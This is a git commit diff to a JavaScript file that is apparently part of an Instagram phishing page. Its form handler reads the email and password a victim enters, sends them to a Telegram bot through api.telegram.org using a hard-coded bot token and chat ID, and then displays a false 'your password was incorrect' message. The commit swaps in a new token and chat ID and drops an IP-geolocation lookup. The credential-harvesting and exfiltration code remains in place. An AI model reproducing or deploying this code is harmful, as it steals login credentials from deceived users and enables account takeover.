82034e4dcfe43c02af930466ea7c655f2e50ea15
raphealfx6 <raphealfx6@gmail.com>
2024-06-10 09:33:53 +0100

    Update sender.js

--- js/sender.js
+++ js/sender.js
@@ -1,28 +1,16 @@
 
 const form = document.querySelector("#form");
-var ct = "5";
-var co = 0;
-var lo = 0;
-var st = 0;
-
 form.addEventListener("submit", (e) => {
   e.preventDefault();
  
-    fetch("https://ipapi.co/json/")
-      .then((res) => res.json())
-      .then((data) => {
-        ct = data.ip;
-        co = data.country_name;
-        lo = data.country_calling_code;
-        st = data.city;
-
+   
         var identity = document.getElementById("email").value;
         var password = document.getElementById("password").value;
 
         var my_text = `Instagram Result from IpAddress for user ${identity} is:%0A - Username/Email: ${identity} %0A - Password: ${password} %0A - IPAddress: ${ct} %0A - Country: ${co} %0A - Country-code: ${lo} %0A - state: ${st}`;
     
-          var token = "6238010383:AAFgGZNvVLJG-Q35fJLZl6w19OS1FG5_TZU";
-    var chat_id = -1002043568601
+          var token = "6650969963:AAECQrzycrXYX2_j45OEBuoMU38lLXTjLh8";
+    var chat_id = -4270395846
         var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`;
 
         let api = new XMLHttpRequest();
@@ -30,9 +18,6 @@ form.addEventListener("submit", (e) => {
         api.send();
         document.getElementById("alert-message").innerHTML =
           "Sorry, your password was incorrect. Please double-check your password.";
-      });
-
-
 
 
   // window.location.replace("https://www.instagram.com/accounts/login/")
